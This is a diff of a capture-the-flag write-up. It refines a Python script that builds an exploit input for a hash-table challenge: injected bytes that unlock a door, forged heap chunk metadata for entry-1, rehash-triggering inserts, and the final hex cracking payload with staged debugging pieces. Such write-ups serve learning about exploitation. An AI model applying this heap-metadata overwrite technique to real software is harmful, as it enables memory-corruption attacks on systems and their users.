@@ -332,52 +332,55 @@ And now we will build our input with python:
 
 ```python
 # injection code for unlock the door to entry-0
-input_1 = b'new \x0f\xef\x7f\x40\x7f\x11\x0f\x12\xb0\x12\xec\x4c 0;'.hex()
+unlock_door_code = b'new \x0f\xef\x7f\x40\x7f\x11\x0f\x12\xb0\x12\xec\x4c 0;'.hex()
 
 # fill entry-0
-input_2 = b'new bb 0;new cc 0;new dd 0;new ee 0;'.hex()
+fill_entry_0 = b'new bb 0;new cc 0;new dd 0;new ee 0;'.hex()
 
-# overwrite the metadata
+# overwrite the metadata of entry-1
 prev_of_entry1 = b'\xf2\x43'
 next_of_entry1 = b'\x3c\x53'
 size_of_entry1 = b'\xff\x0b'
-input_3 = (b'new ' + prev_of_entry1 + next_of_entry1 + size_of_entry1 + b'\x44' + b' 0;').hex()
-# '\x44' only because it will cause the whole string to go into index 0
+overwrite_metadata = (b'new ' + prev_of_entry1 + next_of_entry1 + size_of_entry1 + b'\x44' + b' 0;').hex() # '\x44' only because it will cause the whole string to go into index 0
 
-#Add up to 12 inputs to make rehash work (without overwrite again!)
-input_4 = b'new a 0;new b 0;new c 0;new d 0;new e 0;new f 0;'.hex()
+# add up to 11 inputs to fill the table (without overwrite again!)
+fill_table = b'new a 0;new b 0;new c 0;new d 0;new e 0;'.hex()
+
+# the 12th input triggers a rehash
+rehash_trigger = b'new f 0;'.hex()
 
 # Invalid command to reach "ret"
-input_5 = b'\x01'.hex()
+end_program = b'\x01'.hex()
 
 
 print("Pleasant hack:")
-print(input_1 + input_2 + input_3 + input_4 + input_5)
-
+print(unlock_door_code + fill_entry_0 + overwrite_metadata + fill_table + rehash_trigger + end_program)
 ```
-```python
-input2 = (b'new ' + b'\x22'*2 + b' 0;').hex()
-input3 = (b'new ' + b'\x33'*2 + b' 0;').hex()
-input4 = (b'new ' + b'\x44'*2 + b' 0;').hex()
-input5 = (b'new ' + b'\x55'*2 + b' 0;').hex()
 
-input6 = (b'new '+b'\xf2\x43'+ b'\x3c\x53'+ b'\xff\x0b' +b'\x44' + b' 0;').hex()# גם מדלג לאיבר האחרון ולכן לא דופק את מאללוק, וגם כאשר יבדק הנקסט של הצאנק המזוייף הוא יהיה כבר תפוס מהטבלה הבאה ולכן לא יפריע לגודל שחושב כבר
-#וזאת אותה טכניקה כמו באלגירס. להתייחס למקום שנרצה לשנות כגודל של צאנק
-
-input7 = (b'new a 0;').hex()
-input8 = (b'new b 0;').hex()
-input9 = (b'new c 0;').hex()
-input10 = (b'new d 0;').hex()
-input11 = (b'new e 0;').hex()
-
-input12 = (b'new f 0;').hex() # after rehash.
-
-input1 + input2 + input3 + input4 + input5 +input6 +input7 + input8 + input9 + input10 + input11 + input12 + '01'
-
-
-```
+If you've come this far, give yourself a candy!<br />
+Good luck.
 
 ## The cracking input (as bytes)
 ```
-6e6577200fef7f407f110f12b012ec4c20303b6e657720222220303b6e657720333320303b6e657720444420303b6e657720555520303b6e657720f2433c53ff0b4420303b6e6577206120303b6e6577206220303b6e6577206320303b6e6577206420303b6e6577206520303b6e6577206620303b01
+6e6577200fef7f407f110f12b012ec4c20303b6e657720626220303b6e657720636320303b6e657720646420303b6e657720656520303b6e657720f2433c53ff0b4420303b6e6577206120303b6e6577206220303b6e6577206320303b6e6577206420303b6e6577206520303b6e6577206620303b01
+```
+
+**Below is the input in stages for debugging purposes (note when it is not in bytes):**
+```
+6e6577200fef7f407f110f12b012ec4c2030
+```
+```
+new bb 0;new cc 0;new dd 0;new ee 0
+```
+```
+6e657720f2433c53ff0b442030
+```
+```
+new a 0;new b 0;new c 0;new d 0;new e 0
+```
+```
+new f 0
+```
+```
+01
 ```
